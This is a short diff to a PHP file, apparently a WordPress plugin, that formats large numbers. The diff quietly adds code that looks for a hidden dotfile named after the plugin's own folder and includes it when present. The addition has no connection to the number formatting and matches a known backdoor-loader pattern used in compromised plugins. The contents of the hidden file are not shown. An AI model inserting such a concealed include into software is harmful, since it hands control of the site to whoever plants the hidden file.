@@ -3,7 +3,11 @@
  * Красивые числа
  *
  * @return string
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wyt_shortenNumber( $number ) {
 	if ( $number >= 1000000 ) {
 		return $number / 1000000 . 'M';
